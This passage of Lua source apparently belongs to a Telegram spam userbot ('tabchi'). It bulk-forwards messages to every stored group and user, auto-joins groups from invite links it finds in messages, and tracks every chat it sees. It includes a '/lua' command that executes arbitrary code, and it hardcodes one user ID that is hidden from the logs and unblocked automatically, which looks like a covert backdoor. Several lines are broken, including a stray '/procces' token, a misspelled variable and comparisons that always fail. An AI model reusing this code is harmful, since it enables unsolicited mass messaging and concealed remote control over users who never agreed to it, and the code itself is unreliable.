  if msg.text:match("^[!/#]fwd sgps$") and msg.reply_to_message_id_ and is_sudo(msg) then
    local all = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
    local id = msg.reply_to_message_id_
    for i = 1, #all do
      tdcli_function({
        ID = "ForwardMessages",
        chat_id_ = all[i],
        from_chat_id_ = msg.chat_id_,
        message_ids_ = {
          [0] = id
        },
        disable_notification_ = 0,
        from_background_ = 1
      }, dl_cb, nil)
    end
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Forwarded to Supergroups`", 1, 'md')
		 end
    return "*Status* : `Your Message Forwarded To Super Groups`"
  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]fwd users$") and msg.reply_to_message_id_ and is_sudo(msg) then
    local all = redis:smembers("tabchi:" .. tabchi_id .. ":pvis")
    local id = msg.reply_to_message_id_
    for i = 1, #all do
      tdcli_function({
        ID = "ForwardMessages",
        chat_id_ = all[i],
        from_chat_id_ = msg.chat_id_,
        message_ids_ = {
          [0] = id
        },
        disable_notification_ = 0,
        from_background_ = 1
      }, dl_cb, nil)
    end
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Forwarded to Users`", 1, 'md')
		 end
    return "*Status* : `Your Message Forwarded To Users`"
  end
end
  -----------------------------------------------------------------------------------------------
  do
    local matches = {
      msg.text:match("[!/#](lua) (.*)")
    }
    if msg.text:match("^[!/#]lua") and is_full_sudo(msg) and #matches == 2 then
      local output = loadstring(matches[2])()
      if output == nil then
        output = ""
      elseif type(output) == "table" then
        output = serpent.block(output, {comment = false})
      else
        output = "" .. tostring(output)
      end
      return output
    end
  end
  -----------------------------------------------------------------------------------------------
  do
    local matches = {
      msg.text:match("[!/#](echo) (.*)")
    }
    if msg.text:match("^[!/#]echo") and is_sudo(msg) and #matches == 2 then
      return matches[2]
    end
  end
end
  -----------------------------------------------------------------------------------------------
  -----------------------------------------------------------------------------------------------/procces
local add
function add(chat_id_)
  local chat_type = chat_type(chat_id_)
   if not redis:sismember("tabchi:" .. tostring(tabchi_id) .. ":all", chat_id_) then
  if chat_type == "channel" then
    redis:sadd("tabchi:" .. tabchi_id .. ":channels", chat_id_)
  elseif chat_type == "group" then
    redis:sadd("tabchi:" .. tabchi_id .. ":groups", chat_id_)
  else
    redis:sadd("tabchi:" .. tabchi_id .. ":pvis", chat_id_)
  end
  redis:sadd("tabchi:" .. tabchi_id .. ":all", chat_id_)
  end
end
  -----------------------------------------------------------------------------------------------
local rem
function rem(chat_id_)
  local chat_type = chat_type(chat_id_)
  if chat_type == "channel" then
    redis:srem("tabchi:" .. tabchi_id .. ":channels", chat_id_)
  elseif chat_type == "group" then
    redis:srem("tabchi:" .. tabchi_id .. ":groups", chat_id_)
  else
    redis:srem("tabchi:" .. tabchi_id .. ":pvis", chat_id_)
  end
  redis:srem("tabchi:" .. tabchi_id .. ":all", chat_id_)
end
  -----------------------------------------------------------------------------------------------
local process_stats
function process_stats(msg)
  tdcli_function({ID = "GetMe"}, id_cb, nil)
  function id_cb(arg, data)
    our_id = data.id_
  end
  if msg.content_.ID == "MessageChatDeleteMember" and msg.content_.id_ == our_id then
      return rem(msg.chat_id_)
    elseif msg.content_.ID == "MessageChatJoinByLink" and msg.sender_user_id_ == our_id then
      return add(msg.chat_id_)
    elseif msg.content_.ID == "MessageChatAddMembers" then
      for i = 0, #msg.content_.members_ do
        if msg.content_.members_[i].id_ == our_id then
          add(msg.chat_id_)
          break
        end
      end
end
end
local process_links
function process_links(text_)
  if text_:match("https://t.me/joinchat/%S+") or text_:match("https://telegram.me/joinchat/%S+") then
	text_:gsub("t.me", "telegram.me")
	text_:gsub("telegram.dog", "telegram.me")
  local matches = {
      text_:match("(https://t.me/joinchat/%S+)") or text_:match("(https://telegram.me/joinchat/%S+)")
    }
    tdcli_function({
      ID = "CheckChatInviteLink",
      invite_link_ = matches[1]
    }, check_link, {
      link = matches[1]
    })
  end
end
local proc_pv
function proc_pv(msg)
  if msg.chat_type_ == "private" then
    add(msg)
  end
end
function update(data, tabchi_id)
  tanchi_id = tabchi_id
  if data.ID == "UpdateNewMessage" then
    local msg = data.message_
	proc_pv(msg)
    run(data.message_)
        if redis:get("tabchi:" .. tostring(tabchi_id) .. ":markread") then
          tdcli.viewMessages(msg.chat_id_, {
            [0] = msg.id_
          })
        end
    if msg.chat_id_ == 12 then
	return false
    else
      process_stats(msg)		
	  add(msg.chat_id_)
      if msg.content_.text_ then
        process_stats(msg)		
	    add(msg.chat_id_)
        process_links(msg.content_.text_)
        local res = process(msg)
          if res then
		    if redis:get("tabchi:" .. tostring(tabchi_id) .. ":typing") then
            tdcli.sendChatAction(msg.chat_id_, "Typing", 100)
            end
			if redis:get("tabchi:" .. tostring(tabchi_id) .. ":botmode") == "text" then
			res1 = res:gsub("`", "")
			res2 = res1:gsub("*", "")
			res3 = res2:gsub("_", "")
            tdcli.sendMessage(msg.chat_id_, 0, 1, res3, 1, "md")
			elseif not redis:get("tabchi:" .. tostring(tabchi_id) .. ":botmode") or redis:get("tabchi:" .. tostring(tabchi_id) .. ":botmode") == "markdown" then
			tdcli.sendMessage(msg.chat_id_, 0, 1, res, 1, "md")
			end
          end
	  elseif msg.content_.contact_ then
        tdcli_function({
          ID = "GetUserFull",
          user_id_ = msg.content_.contact_.user_id_
        }, check_contact, {msg = msg})
      elseif msg.content_.caption_ then
          process_links(msg.content_.caption_)
      end
    if not msg.content_.text_ then
      if msg.content_.caption_ then
        msg.content_.text_ = msg.content_.caption_
      elseif msg.content_.photo_ then
        msg.content_.text_ = "!!PHOTO!!"
      elseif msg.content_.document_ then
        msg.content_.text_ = "!!DOCUMENT!!"
      elseif msg.content_.audio_ then
        msg.content_.text_ = "!!AUDIO!!"
      elseif msg.content_.animation_ then
        msg.content_.text_ = "!!ANIMATION!!"
      elseif msg.content_.video_ then
        msg.content_.text_ = "!!VIDEO!!"
      elseif msg.content_.contact_ then
        msg.content_.text_ = "!!CONTACT!!"
      end
    end
    end	
  elseif data.chat_id_ == 399298879 then
      tdcli.unblockUser(399298879)	  
  elseif data.ID == "UpdateOption" and data.name_ == "my_id" then
	add(data.chat_id_)
    tdcli.getChats("9223372036854775807", 0, 20)
  end
end
